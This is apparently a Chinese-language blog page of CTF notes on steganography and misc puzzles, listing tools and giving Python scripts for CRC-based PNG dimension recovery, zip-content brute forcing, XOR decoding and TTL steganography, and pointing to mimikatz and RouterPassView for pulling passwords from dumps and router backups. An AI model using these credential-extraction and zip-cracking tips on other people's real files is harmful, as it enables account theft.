<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://theganlove.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://theganlove.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-隐写系列" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/09/01/%E9%9A%90%E5%86%99%E7%B3%BB%E5%88%97/" class="article-date">
  <time class="dt-published" datetime="2024-09-01T13:50:13.000Z" itemprop="datePublished">2024-09-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/09/01/%E9%9A%90%E5%86%99%E7%B3%BB%E5%88%97/">隐写系列</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <ol>
<li>有时候会遇见需要改宽高的情况，一般会根据图片的crc值爆破出正确的宽高。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">CRC=<span class="number">0x6D7C7135</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dabai.png&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    crcbp=f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == CRC):</span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>也可以考虑下面这个脚本自动改宽高并生成文件(仅限png):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">file = <span class="string">&#x27;/Users/constellation/Downloads/misc26.png&#x27;</span></span><br><span class="line">fr = <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">data = <span class="built_in">bytearray</span>(fr[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line"><span class="comment">#crc32key = str(fr[29:33]).replace(&#x27;\\x&#x27;,&#x27;&#x27;).replace(&quot;b&#x27;&quot;,&#x27;0x&#x27;).replace(&quot;&#x27;&quot;,&#x27;&#x27;)</span></span><br><span class="line">crc32key = <span class="number">0xEC9CCBC6</span> <span class="comment">#补上0x，copy hex value</span></span><br><span class="line"><span class="comment">#data = bytearray(b&#x27;\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00&#x27;)  #hex下copy grep hex</span></span><br><span class="line">n = <span class="number">4095</span> <span class="comment">#理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):<span class="comment">#高和宽一起爆破</span></span><br><span class="line">    width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))<span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">        crc32result = zlib.crc32(data)</span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;width:<span class="subst">&#123;width.<span class="built_in">hex</span>()&#125;</span>\nheight:<span class="subst">&#123;height.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">            newpic = <span class="built_in">bytearray</span>(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;file&#125;</span>.png&quot;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close()</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>遇见webshell查杀题直接用D盾扫。例题:<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#webshell%E5%90%8E%E9%97%A8">webshell后门</a></li>
<li>音频隐写题首先考虑audacity打开看波形图和频谱图。发现可疑的线索时多缩放。今天就看见了一道藏摩斯电码然而默认缩放比例下无法展示完全的题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%E6%9D%A5%E9%A6%96%E6%AD%8C%E5%90%A7">来首歌吧</a></li>
<li>从宽带备份文件出恢复账户名密码名等信息：使用工具<a target="_blank" rel="noopener" href="https://www.nirsoft.net/utils/router_password_recovery.html">RouterPassView</a>。</li>
<li>vmdk后缀文件可以在linux下直接用7z解压。例题：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45485719/article/details/107417878">面具下的flag</a></li>
<li>隐写工具：</li>
</ol>
<ul>
<li>zsteg</li>
</ul>
<blockquote>
<p>zsteg xxx.png(仅图片)<br>如果zsteg输出类似这样的东西：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extradata:0         .. file: Zip archive data, at least v2.0 to extract, compression method=AES Encrypted</span><br></pre></td></tr></table></figure>

<p>说明这里有文件可以提取。记住开始的字符串，使用以下命令提取：</p>
<ul>
<li>zsteg -E “extradata:0” ctf.png &gt; res.zip</li>
<li>binwalk<ul>
<li>binwalk xxx(支持任何类型，加上-e可以提取，不过有时候提取不出来，下方的foremost补充使用)</li>
<li>binwalk可能会提取出一些Zlib compressed data，有时候flag会藏在里面。</li>
</ul>
</li>
<li>foremost(有时候即使binwalk没有提示任何文件，foremost也能提取出东西。所以binwalk提示没有问题时，也不要忘记试foremost)</li>
<li>outguess，例题：<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/4%E7%BA%A7/Misc/Avatar.md">Avatar</a>。注意有时候outguess会需要密码，密码可能藏在exif里。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/108936734">[ACTF新生赛2020]outguess</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/matthewgao/F5-steganography">F5隐写</a>，例题：<a target="_blank" rel="noopener" href="https://blog.csdn.net/destiny1507/article/details/102079695">刷新过的图片</a>。另一个更详细的F5隐写变种题:<a target="_blank" rel="noopener" href="https://github.com/Aryvd/Aryvd/tree/main/Refresh!">Refresh!</a></li>
<li>stegsolve</li>
<li>NtfsStreamsEditor,用于处理NTFS流隐藏文件。例题：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/108934265">[SWPU2019]我有一只马里奥</a>。当题目涉及到NTFS流时，题目文件都需要用Win RAR解压。</li>
<li><a target="_blank" rel="noopener" href="https://achorein.github.io/silenteye/">SilentEye</a>（音频隐写工具）</li>
<li>steghide（多类型文件隐写工具）</li>
</ul>
<blockquote>
<p>steghide有时需要密码，可以用<a target="_blank" rel="noopener" href="https://github.com/RickdeJager/stegseek">stegseek</a>破解。</p>
</blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/AngelKitty/stegosaurus">Stegosaurus</a>(pyc文件隐写工具)</li>
<li><a target="_blank" rel="noopener" href="http://jpinsoft.net/deepsound/overview.aspx">DeepSound</a>（音频隐写工具）</li>
<li><a target="_blank" rel="noopener" href="https://github.com/ragibson/Steganography">stegolsb</a>.</li>
</ul>
<blockquote>
<p>LSB隐写工具，音频图片都可以。</p>
</blockquote>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://holloway.nz/steg/">Twitter Secret Messages</a>。这个工具的密文很好辨认，例如<code>I hａtｅ tｈis flｙiｎｇ ｂⅰrｄ aｐp... Peοpｌe saｙ ｏnｅ thіngｂutyoｕ ａｌｗayｓ gοtta reａd bｅtｗeen thｅliｎeｓ ｔο interpret them right ://</code>。推特&#x2F;蓝鸟是出题人的提示关键词。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.petitcolas.net/steganography/mp3stego/">mp3stego</a>.mp3带密码的隐写工具。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/AdamNiederer/base100">base100</a>。将文字与emoji互相转换的编码工具。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/JavDomGom/videostego">videostego</a></p>
<blockquote>
<p>视频文件的LSB隐写工具。若没有后续改动的话，被隐写后的视频的exif的Writer栏为JavDomGom</p>
</blockquote>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.openstego.com/">OpenStego</a></p>
<ul>
<li>bmp&#x2F;png文件隐写工具，需要密码</li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/Byxs20/PuzzleSolver">PuzzleSolver</a></p>
<ul>
<li>能干的事情很多，不止隐写。不过我认识到这个工具是因为里面有个python3频率盲水印，用其他的脚本提取不出来</li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://dothidden.xyz/la_ctf_2024/discord_events/">discord events</a></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://stegcloak.surge.sh/">Steg Cloak</a>的解码。被Steg Cloak加密的文字会包含不可见字符</li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/RJCyber1/VishwaCTF-2024-Writeups/blob/main/Steg/Professor's%20Inheritance.md">Professor’s Inheritance</a></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/osde8info/stegosuite">Stegosuite</a></li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://berliangabriel.github.io/post/shakti-ctf-2024-foren">Aqua Gaze</a></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/lukechampine/jsteg">jsteg</a></li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/LazyTitan33/CTF-Writeups/blob/main/Unbreakable-Individual-2024/secrets-of-winter.md">secrets-of-winter</a></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/bannsec/stegoVeritas">StegoVeritas</a></li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://warlocksmurf.github.io/posts/sdctf2024/#watch-the-waves-forensics">Watch the Waves</a></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://directmusic.me/wav2png/">wav2png</a></li>
<li>如果png转出来的wav听不清，可尝试在stegsolve里换一下bit planes</li>
<li>这题的第二部分有sstv命令使用例子</li>
<li>官方的脚本： <a target="_blank" rel="noopener" href="https://github.com/acmucsd/sdctf-2024/tree/main/forensics">https://github.com/acmucsd/sdctf-2024/tree/main/forensics</a></li>
</ul>
</li>
</ul>
<ol>
<li>当遇见单独加密的压缩包时，首先确认是不是<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/1%E7%BA%A7/Misc/fakezip.md">伪加密</a>。不同版本的zip加密位不一样,例如有些zip需要将第7个字节的09改成00。如果不是，考虑到没有其它提示的因素，可以尝试直接ARCHPR爆破，常见的爆破掩码为4位数字。</li>
<li>010Editor自带很多文件类型模板，把常用的例如png装上，鼠标悬浮在数据上就能得到那些数据代表的内容。修改单个字节可以鼠标选中要修改的字节，然后菜单栏-&gt;编辑-&gt;插入&#x2F;覆盖-&gt;插入字节</li>
<li>numpy.loadtxt读取坐标文件+基本matplotlib图像绘制。例题:<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Misc/%E6%A2%85%E8%8A%B1%E9%A6%99%E4%B9%8B%E8%8B%A6%E5%AF%92%E6%9D%A5.md">梅花香之苦寒来</a></li>
<li>audacity打开文件发现有两个声道且其中一个声道没用时，可以在最左侧调节左右声道的音量，然后菜单栏-&gt;文件-&gt;导出。</li>
<li>morse2ascii工具可以解码音频摩斯电码。例题：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tac2664/p/13861595.html">穿越时空的思念</a></li>
<li><a target="_blank" rel="noopener" href="https://www.dcode.fr/braille-alphabet">盲文解密</a>（Braille Alphabet），形如<code>⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍=</code>。</li>
<li>当题目文件出现大量无特征、无规律字符时，考虑是不是字频统计。例题:<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GXYCTF2019]gakki">[GXYCTF2019]gakki</a></li>
<li>010Editor可以更改阅读文本文件时的编码。菜单栏-&gt;视图-&gt;字符集。</li>
<li>福尔摩斯跳舞的小人密码。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109387134">[SWPU2019]伟大的侦探</a></li>
<li>音符密码，形如<code>♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=</code>。可在<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">此处</a>直接解密。</li>
<li>AAEncode，特征是颜文字，是将js代码转换为颜文字的编码。可用<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=703">网站</a>在线解码。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109481013">[SUCTF2018]single dog</a>。</li>
<li>敲击码。类似棋盘密码，只不过与平时的棋盘排版不同，C和K在一个格，形如下方展示，&#x2F;表示分割。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..... ../... ./... ./... ../</span><br><span class="line">  5,2     3,1    3,1    3,2</span><br></pre></td></tr></table></figure>

<p>例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109449494">[SWPU2019]你有没有好好看网课?</a></p>
<ol start="22">
<li>不要忘记查看压缩包注释。不装软件的情况下似乎看不到，可以安装Bandzip工具。</li>
<li>遇见docx文件时，粗略看一遍看不出来线索就改后缀名为rar后解压查看里面是否有东西，或者直接binwalk -e提取内容。</li>
<li><a target="_blank" rel="noopener" href="https://github.com/livz/cloacked-pixel">lsb隐写工具</a>（不是stegsolve可以提取的那种lsb隐写，可以加密码的另外一种）</li>
<li>视频题粗略看一遍后最好放慢来看有没有漏掉的信息，可用<a target="_blank" rel="noopener" href="https://www.kinovea.org/">Kinovea</a>。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109461931">[RoarCTF2019]黄金6年</a></li>
<li>磁盘、映像题，比如iso文件，打开后注意勾选上“隐藏的项目”，这种藏文件的方法不能漏掉了。</li>
<li>pdf文件可以用photoshop等软件打开，能找到里面隐藏的图片等内容。</li>
<li>crc值爆破恢复文件内容。zip加密的文件内容不应过小，因为此时攻击者可以通过爆破crc值的形式恢复文件内容。例题:<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/4%E7%BA%A7/Misc/crc.md">crc</a>。下方脚本可以通过crc值破解多个zip，并将zip的内容写入一个文件中。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CrackCrc</span>(<span class="params">crc</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">				<span class="keyword">for</span> h <span class="keyword">in</span> dic:</span><br><span class="line">					s = i + j + k + h</span><br><span class="line">					<span class="keyword">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class="line">						f.write(s)</span><br><span class="line">						<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CrackZip</span>():</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">68</span>):</span><br><span class="line">		file = <span class="string">&#x27;out&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">		crc = zipfile.ZipFile(file,<span class="string">&#x27;r&#x27;</span>).getinfo(<span class="string">&#x27;data.txt&#x27;</span>).CRC</span><br><span class="line">		CrackCrc(crc)</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>+<span class="string">&quot;loading：&#123;:%&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">float</span>((i+<span class="number">1</span>)/<span class="number">68</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">&#x27;+/=&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nCRC32begin&quot;</span>)</span><br><span class="line">CrackZip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nCRC32finished&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<ol start="29">
<li>中文电码+五笔编码。例题:<a href="../../CTF/BUUCTF/Crypto/%E4%BF%A1%E6%81%AF%E5%8C%96%E6%97%B6%E4%BB%A3%E7%9A%84%E6%AD%A5%E4%BC%90.md">信息化时代的步伐</a></li>
<li>DTMF拨号音识别+手机键盘密码。DTMF拨号音就像平时座机拨号的声音，手机键盘密码就是9键。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/105412940">[WUSTCTF2020]girlfriend</a>，使用工具<a target="_blank" rel="noopener" href="http://hl.altervista.org/split.php?http://aluigi.altervista.org/mytoolz/dtmf2num.zip">dtmf2num</a></li>
<li>mimikatz可分析dmp后缀文件并获取密码。例题：<a href="../../CTF/BUUCTF/Misc/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5DAttack.md">[安洵杯 2019]Attack</a></li>
<li>当一串base64解码后是<code>Salted__</code>，可能的密文格式为AES，3DES或者Rabbit。</li>
<li>usb流量包数据提取。例题:<a href="../../CTF/moectf/2022/Misc/usb.md">usb</a></li>
<li>rar文件可以通过更改文件结构隐藏文件，效果是让rar里有的文件解压不出来。用010 Editor打开rar文件，注意用文件名的区域开头是否是74（在<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/199854.html">RAR文件结构</a>中，文件块的位置应该是74并不是7A，74让文件可以被解压出来，7A则不能），如果不是要改成74让文件被解压出来。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109632626">USB</a></li>
<li>python3 单字节16进制异或结果写入文件。今天遇到一道题，文本文件里的内容需要需要单字节与5异或后转为16进制写入文件。不知道为啥大佬们的脚本我用不了，可能是版本的问题，故自己写了一个python3的简陋玩意。题目:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/105367979">[GUET-CTF2019]虚假的压缩包</a></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">original = <span class="built_in">open</span>(<span class="string">&quot;亦真亦假&quot;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;ctf&quot;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> original:</span><br><span class="line">	tmp = <span class="built_in">int</span>(i,<span class="number">16</span>)^<span class="number">5</span></span><br><span class="line">	res+=<span class="built_in">hex</span>(tmp)[<span class="number">2</span>:]</span><br><span class="line">flag.write(long_to_bytes(<span class="built_in">int</span>(res,<span class="number">16</span>)))</span><br></pre></td></tr></table></figure>

<ol start="36">
<li>ttl隐写脚本。例题:<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109633675">[SWPU2019]Network</a></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;attachment.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    a=fp.readlines()</span><br><span class="line">    p=[]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">       p.append(<span class="built_in">int</span>(a[x])) </span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">63</span>):</span><br><span class="line">            b=<span class="string">&#x27;00&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span>(i==<span class="number">127</span>):</span><br><span class="line">            b=<span class="string">&#x27;01&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span>(i==<span class="number">191</span>):</span><br><span class="line">            b=<span class="string">&#x27;10&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b=<span class="string">&#x27;11&#x27;</span></span><br><span class="line">        s +=b</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">8</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(s[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">flag = binascii.unhexlify(flag)</span><br><span class="line">wp = <span class="built_in">open</span>(<span class="string">&#x27;ans&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">wp.write(flag)</span><br><span class="line">wp.close()</span><br></pre></td></tr></table></figure>

<ol start="37">
<li>logo编程语言，可用于绘画，形如：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.calormen.com/jslogo/">在线解释器</a></p>
<ol start="38">
